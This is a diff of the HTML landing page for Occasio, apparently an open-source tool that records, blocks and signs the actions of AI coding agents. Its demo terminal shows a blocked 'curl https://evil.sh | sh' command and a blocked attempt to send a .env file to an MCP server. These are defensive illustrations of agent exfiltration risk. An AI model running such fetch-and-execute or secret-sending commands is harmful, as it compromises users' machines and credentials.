@@ -3,21 +3,21 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Occasio — local black-box recorder for AI coding agents</title>
-  <meta name="description" content="Occasio is the local black-box recorder for AI coding agents. Tamper-evident, Sigstore-signed audit trail for Claude Code and other AI coding agents. Local-first audit and policy proxy. Install: npm install -g @occasiolabs/occasio.">
-  <meta name="keywords" content="Occasio, Occasio Labs, @occasiolabs/occasio, AI coding agent audit, Claude Code security, MCP security, local-first audit and policy proxy, tamper-evident audit logs, Sigstore, AI agent observability, black-box recorder">
+  <title>Occasio — see what your AI coding agent did, then prove it</title>
+  <meta name="description" content="Occasio is the local black-box recorder for AI coding agents. It records every file, command, and MCP call your agent makes — hash-chained, Sigstore-signed, third-party-verifiable. Logs can be edited; this can't. Local-first, no cloud, no telemetry. Install: npm install -g @occasiolabs/occasio.">
+  <meta name="keywords" content="Occasio, Occasio Labs, @occasiolabs/occasio, see what AI agent did, prove what AI agent did, AI coding agent audit, tamper-evident audit trail, Sigstore, in-toto attestation, Claude Code security, MCP security, agent egress enforcement, local-first audit and policy proxy, black-box recorder, EU AI Act Article 12">
   <meta name="author" content="Occasio Labs">
   <link rel="canonical" href="https://useoccasio.com/">
 
   <meta property="og:type" content="website">
-  <meta property="og:title" content="Occasio — local black-box recorder for AI coding agents">
-  <meta property="og:description" content="Tamper-evident, Sigstore-signed audit trail for Claude Code and other AI coding agents.">
+  <meta property="og:title" content="Occasio — see what your AI coding agent did, then prove it">
+  <meta property="og:description" content="Your agent has your shell, your files, your secrets. Occasio records every action locally and lets you prove exactly what it did — a signed record nobody can edit after the fact.">
   <meta property="og:url" content="https://useoccasio.com/">
   <meta property="og:site_name" content="Occasio Labs">
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Occasio — local black-box recorder for AI coding agents">
-  <meta name="twitter:description" content="Tamper-evident, Sigstore-signed audit trail for Claude Code and other AI coding agents.">
+  <meta name="twitter:title" content="Occasio — see what your AI coding agent did, then prove it">
+  <meta name="twitter:description" content="Logs can be edited. Occasio's record can't. Hash-chained, Sigstore-signed, verifiable by anyone — local-first.">
 
   <link rel="alternate" type="text/markdown" href="/llms.txt" title="llms.txt">
 
@@ -29,7 +29,7 @@
     "alternateName": "@occasiolabs/occasio",
     "applicationCategory": "DeveloperApplication",
     "operatingSystem": "macOS, Linux, Windows",
-    "description": "Occasio is the local black-box recorder for AI coding agents. Tamper-evident, Sigstore-signed audit trail for Claude Code and other AI coding agents. Local-first audit and policy proxy.",
+    "description": "Occasio is the local black-box recorder for AI coding agents. It records every file, command, and MCP call your agent makes — hash-chained, Sigstore-signed, and third-party-verifiable — so you can prove exactly what the agent did. Local-first, no cloud, no telemetry.",
     "url": "https://useoccasio.com/",
     "downloadUrl": "https://www.npmjs.com/package/@occasiolabs/occasio",
     "softwareVersion": "0.10.0",
@@ -49,54 +49,254 @@
   </script>
 
   <style>
-    :root { color-scheme: light dark; }
-    body { font: 16px/1.55 system-ui, -apple-system, "Segoe UI", sans-serif; max-width: 720px; margin: 2rem auto; padding: 0 1rem; }
-    h1 { font-size: 1.8rem; margin-bottom: 0.25rem; }
-    .tagline { font-size: 1.15rem; opacity: 0.85; margin-top: 0; }
-    pre, code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
-    pre { background: rgba(127,127,127,0.12); padding: 0.75rem 1rem; border-radius: 6px; overflow-x: auto; }
-    code { background: rgba(127,127,127,0.12); padding: 0.1em 0.35em; border-radius: 3px; }
-    h2 { margin-top: 2rem; }
-    ul { padding-left: 1.25rem; }
-    a { color: inherit; }
-    footer { margin-top: 3rem; font-size: 0.9rem; opacity: 0.7; }
+    :root {
+      color-scheme: dark;
+      --bg: #0a0d14;
+      --panel: #11151f;
+      --panel-2: #0d111a;
+      --line: #1e2533;
+      --fg: #e7ecf3;
+      --muted: #8b95a7;
+      --accent: #5eead4;   /* teal — chain / signed */
+      --green: #4ade80;
+      --amber: #fbbf24;
+      --red: #f87171;
+      --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+      --sans: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    }
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      background: radial-gradient(1200px 600px at 50% -10%, #131a28 0%, var(--bg) 55%) no-repeat, var(--bg);
+      color: var(--fg);
+      font: 16px/1.6 var(--sans);
+      -webkit-font-smoothing: antialiased;
+    }
+    .wrap { max-width: 860px; margin: 0 auto; padding: 0 1.25rem; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    code, pre, .mono { font-family: var(--mono); }
+
+    header.top { display: flex; align-items: center; justify-content: space-between; padding: 1.25rem 0; }
+    .brand { font-family: var(--mono); font-weight: 600; letter-spacing: 0.18em; font-size: 0.95rem; }
+    .brand .dot { color: var(--accent); }
+    .top nav a { color: var(--muted); font-size: 0.85rem; margin-left: 1.1rem; }
+    .top nav a:hover { color: var(--fg); }
+
+    .hero { padding: 2.5rem 0 1rem; }
+    .eyebrow { font-family: var(--mono); font-size: 0.78rem; letter-spacing: 0.15em; text-transform: uppercase; color: var(--accent); margin: 0 0 0.9rem; }
+    h1 { font-size: clamp(2.1rem, 5.5vw, 3.2rem); line-height: 1.06; letter-spacing: -0.02em; margin: 0 0 1rem; }
+    h1 .em { color: var(--accent); }
+    .lede { font-size: 1.15rem; color: var(--muted); max-width: 46ch; margin: 0 0 1.8rem; }
+    .lede strong { color: var(--fg); font-weight: 600; }
+
+    .cta { display: flex; flex-wrap: wrap; gap: 0.75rem; align-items: center; }
+    .install {
+      font-family: var(--mono); font-size: 0.92rem; background: var(--panel);
+      border: 1px solid var(--line); border-radius: 8px; padding: 0.7rem 1rem; color: var(--fg);
+    }
+    .install .p { color: var(--accent); user-select: none; }
+    .btn {
+      display: inline-block; padding: 0.7rem 1.15rem; border-radius: 8px;
+      border: 1px solid var(--line); color: var(--fg); font-size: 0.92rem; font-weight: 500;
+    }
+    .btn:hover { border-color: var(--accent); text-decoration: none; }
+
+    .term {
+      margin: 2.5rem 0 1rem; background: var(--panel-2); border: 1px solid var(--line);
+      border-radius: 12px; overflow: hidden; box-shadow: 0 24px 60px -30px rgba(0,0,0,0.8);
+    }
+    .term .bar { display: flex; align-items: center; gap: 0.45rem; padding: 0.7rem 0.9rem; border-bottom: 1px solid var(--line); background: var(--panel); }
+    .term .bar i { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+    .term .bar .r { background: #ff5f56; } .term .bar .y { background: #ffbd2e; } .term .bar .g { background: #27c93f; }
+    .term .bar span { margin-left: 0.5rem; color: var(--muted); font-family: var(--mono); font-size: 0.78rem; }
+    .term pre { margin: 0; padding: 1.1rem 1.2rem; font-size: 0.85rem; line-height: 1.7; overflow-x: auto; }
+    .term .cmd { color: var(--fg); } .term .cmd::before { content: "$ "; color: var(--accent); }
+    .term .dim { color: var(--muted); }
+    .term .ok { color: var(--green); } .term .blk { color: var(--red); font-weight: 600; }
+    .term .sig { color: var(--accent); } .term .am { color: var(--amber); }
+
+    section { padding: 3.5rem 0; border-top: 1px solid var(--line); }
+    h2 { font-size: 1.5rem; letter-spacing: -0.01em; margin: 0 0 0.4rem; }
+    .sub { color: var(--muted); margin: 0 0 2rem; }
+    .grid3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; }
+    .grid2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; }
+    @media (max-width: 640px) { .grid3, .grid2 { grid-template-columns: 1fr; } }
+    .card { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 1.25rem; }
+    .card .k { font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent); }
+    .card.lead { border-color: rgba(94,234,212,0.35); box-shadow: 0 0 0 1px rgba(94,234,212,0.08) inset; }
+    .card h3 { margin: 0.55rem 0 0.4rem; font-size: 1.05rem; }
+    .card p { margin: 0; color: var(--muted); font-size: 0.92rem; }
+    .card .pain { color: var(--red); font-family: var(--mono); font-size: 0.78rem; }
+
+    .verify-note { font-family: var(--mono); font-size: 0.85rem; color: var(--green); margin-top: 1rem; }
+    .lead-line { font-size: 1.15rem; color: var(--fg); margin: 0 0 1.2rem; }
+    .lead-line b { color: var(--accent); }
+    .badges { display: flex; flex-wrap: wrap; gap: 0.6rem; margin-top: 1.5rem; }
+    .badge { font-family: var(--mono); font-size: 0.78rem; color: var(--muted); border: 1px solid var(--line); border-radius: 6px; padding: 0.35rem 0.7rem; }
+    .badge b { color: var(--fg); font-weight: 600; }
+
+    ul.links { list-style: none; padding: 0; margin: 0; display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem; }
+    @media (max-width: 640px) { ul.links { grid-template-columns: 1fr; } }
+    ul.links li { color: var(--muted); font-size: 0.92rem; }
+
+    footer { padding: 2.5rem 0 3.5rem; color: var(--muted); font-size: 0.85rem; border-top: 1px solid var(--line); }
   </style>
 </head>
 <body>
 
-<h1>Occasio</h1>
-<p class="tagline"><strong>Occasio is the local black-box recorder for AI coding agents.</strong></p>
+<div class="wrap">
+  <header class="top">
+    <div class="brand">OCC<span class="dot">·</span>ASIO</div>
+    <nav>
+      <a href="#pain">Why</a>
+      <a href="#how">How</a>
+      <a href="#verify">Verify</a>
+      <a href="#trust">Compliance</a>
+      <a href="https://github.com/occasiolabs/occasio">GitHub</a>
+    </nav>
+  </header>
 
-<p>
-  Tamper-evident, Sigstore-signed audit trail for
-  <a href="https://www.anthropic.com/claude-code">Claude Code</a>
-  and other AI coding agents. Local-first audit and policy proxy.
-  Built by <strong>Occasio Labs</strong>.
-</p>
+  <main>
+    <div class="hero">
+      <p class="eyebrow">Local black-box recorder for AI coding agents</p>
+      <h1>See exactly what your AI coding agent did.<br><span class="em">Then prove it.</span></h1>
+      <p class="lede">
+        Occasio records every file, command, and MCP call your agent makes —
+        <strong>locally, hash-chained, Sigstore-signed.</strong>
+        Logs can be edited. This can't.
+      </p>
+      <div class="cta">
+        <span class="install"><span class="p">$ </span>npm install -g @occasiolabs/occasio</span>
+        <a class="btn" href="https://github.com/occasiolabs/occasio">View on GitHub →</a>
+      </div>
+    </div>
 
-<h2>Install</h2>
-<pre><code>npm install -g @occasiolabs/occasio</code></pre>
+    <div class="term" aria-label="Example Occasio session">
+      <div class="bar"><i class="r"></i><i class="y"></i><i class="g"></i><span>occasio</span></div>
+<pre><span class="cmd">occasio claude</span>
+<span class="dim">● recording  run_id 7f3a91c…  chain ◆━◆━◆━◆</span>
+READ   src/auth.ts                     <span class="ok">✓ logged</span>
+BASH   curl https://evil.sh | sh       <span class="blk">⛔ BLOCK</span>  <span class="dim">policy.yml:14</span>
+READ   .env  → mcp__server             <span class="blk">⛔ BLOCK</span>  <span class="dim">secret stripped before send</span>
+EDIT   src/index.js                    <span class="ok">✓ logged</span>
+<span class="dim">… 3,174 actions · hash-chained · </span><span class="sig">sigstore ✓</span>
 
-<h2>What it does</h2>
-<ul>
-  <li><strong>Black-box recorder</strong> — every tool call your AI coding agent makes is captured locally.</li>
-  <li><strong>Tamper-evident audit logs</strong> — hash-chained, Sigstore-signed pipeline events.</li>
-  <li><strong>Local-first audit and policy proxy</strong> — runs on your machine, no cloud, no telemetry.</li>
-  <li><strong>Policy enforcement</strong> — deny-list, path enforcement, secret redaction, transform rules.</li>
-  <li><strong>Claude Code security</strong> and <strong>MCP security</strong> — native interception of Read, Glob, Grep, TodoWrite, plus MCP routing.</li>
-</ul>
+<span class="cmd">occasio attest verify session.json</span>
+<span class="ok">✓</span> sigstore signature       <span class="dim">valid (Fulcio + Rekor)</span>
+<span class="ok">✓</span> predicate equivalence    <span class="dim">byte-identical</span>
+<span class="ok">✓</span> audit chain integrity    <span class="dim">GENESIS → 3,174 rows</span>
+<span class="sig">verified — there is no "trust us" path</span></pre>
+    </div>
 
-<h2>Links</h2>
-<ul>
-  <li>npm: <a href="https://www.npmjs.com/package/@occasiolabs/occasio">@occasiolabs/occasio</a></li>
-  <li>GitHub: <a href="https://github.com/occasiolabs/occasio">occasiolabs/occasio</a></li>
-  <li>MCP Registry: <code>io.github.occasiolabs/occasio</code></li>
-  <li>For AI crawlers: <a href="/llms.txt">llms.txt</a></li>
-</ul>
+    <section id="pain">
+      <h2>Your agent has your shell, your files, your secrets.</h2>
+      <p class="sub">You handed an AI agent the keys. Do you actually know what it did with them?</p>
+      <div class="grid3">
+        <div class="card">
+          <div class="pain">▟ destructive</div>
+          <h3>It runs real commands</h3>
+          <p>One bad <code>curl | sh</code>, one <code>rm</code> on the wrong path. In one 2025 incident an agent executed 5,000+ shell commands across a single run.</p>
+        </div>
+        <div class="card">
+          <div class="pain">▌ exfiltration</div>
+          <h3>It reads your secrets</h3>
+          <p>An agent (or a poisoned MCP server) reads <code>.env</code> and sends it to the cloud as ordinary context. You never see it leave.</p>
+        </div>
+        <div class="card">
+          <div class="pain">▖ no record</div>
+          <h3>You can't prove anything</h3>
+          <p>When someone asks "did the agent touch prod / read that file?", a normal log is no answer — it can be edited after the fact.</p>
+        </div>
+      </div>
+    </section>
 
-<footer>
-  © Occasio Labs. Occasio is open-source software.
-</footer>
+    <section id="how">
+      <h2>Record. Enforce. Prove.</h2>
+      <p class="sub">Three things, one local-first tool — no cloud, no telemetry, ever.</p>
+      <div class="grid3">
+        <div class="card">
+          <div class="k">Record</div>
+          <h3>Black-box recorder</h3>
+          <p>Every tool call — Read, Edit, Bash, MCP — captured locally as it happens. The flight recorder for your agent.</p>
+        </div>
+        <div class="card">
+          <div class="k">Enforce</div>
+          <h3>Policy at the boundary</h3>
+          <p>Block dangerous actions before they run. Deny-lists, path rules, and more — and the block is recorded too.</p>
+        </div>
+        <div class="card lead">
+          <div class="k">Prove</div>
+          <h3>Tamper-evident attestation</h3>
+          <p>Hash-chained from a GENESIS sentinel, Sigstore-signed. A third party verifies the whole history — without trusting you.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="egress">
+      <h2>It doesn't just watch — it stops the leak.</h2>
+      <p class="lead-line">Most tools <em>observe</em> what the agent sent. Occasio <b>strips denied files and secrets out of the request body before it leaves your machine.</b></p>
+      <div class="grid2">
+        <div class="card">
+          <div class="k">Egress enforcement</div>
+          <h3>Denied content never ships</h3>
+          <p>When the agent pre-bakes a denied file or a secret into the outbound request, Occasio resolves the real path (symlinks too), removes the content, and forwards the rest. The model never receives it.</p>
+        </div>
+        <div class="card">
+          <div class="k">Honest coverage</div>
+          <h3>It tells you what it couldn't intercept</h3>
+          <p>Every tool call gets a coverage code. No silent gaps, no inflated claims — you see exactly what was enforced and what fell through.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="verify">
+      <h2>Verify in 60 seconds</h2>
+      <p class="sub">Hand someone the bundle. They confirm it's genuine offline — no account, no network to us.</p>
+      <div class="term">
+        <div class="bar"><i class="r"></i><i class="y"></i><i class="g"></i><span>third-party verifier</span></div>
+<pre><span class="cmd">occasio attest verify session.json</span>
+<span class="dim"># or, with zero Occasio install — pure stdlib:</span>
+<span class="cmd">python attest_verify.py session.json</span>
+<span class="dim"># or canonical sigstore tooling:</span>
+<span class="cmd">cosign verify-blob --bundle session.sigstore.json session.json</span></pre>
+      </div>
+      <p class="verify-note">Sigstore signature · predicate equivalence · audit-chain integrity — each step independent, any failure fails the whole.</p>
+    </section>
+
+    <section id="trust">
+      <h2>Built for the audit, not the demo</h2>
+      <p class="sub">When your compliance officer, your auditor, or a future you asks "what did the agent do?" — there's a signed answer.</p>
+      <div class="badges">
+        <span class="badge"><b>Sigstore</b> keyless signing</span>
+        <span class="badge"><b>in-toto</b> attestations</span>
+        <span class="badge"><b>hash-chained</b> audit log</span>
+        <span class="badge"><b>CycloneDX</b> AI-BOM</span>
+        <span class="badge"><b>EU AI Act</b> Art. 12 trail</span>
+        <span class="badge"><b>NIST AI RMF</b> mapping</span>
+        <span class="badge"><b>SOC 2</b> CC6.1 / CC7.2</span>
+        <span class="badge"><b>local-first</b> · no telemetry</span>
+      </div>
+    </section>
+
+    <section>
+      <h2>Links</h2>
+      <ul class="links">
+        <li>npm: <a href="https://www.npmjs.com/package/@occasiolabs/occasio">@occasiolabs/occasio</a></li>
+        <li>GitHub: <a href="https://github.com/occasiolabs/occasio">occasiolabs/occasio</a></li>
+        <li>MCP Registry: <code>io.github.occasiolabs/occasio</code></li>
+        <li>For AI crawlers: <a href="/llms.txt">llms.txt</a></li>
+      </ul>
+    </section>
+  </main>
+
+  <footer>
+    © Occasio Labs. Occasio is open-source software (Apache-2.0).
+    Local-first audit and policy proxy for AI coding agents — built for
+    <a href="https://www.anthropic.com/claude-code">Claude Code</a> and other agents.
+  </footer>
+</div>
 
 </body>
 </html>
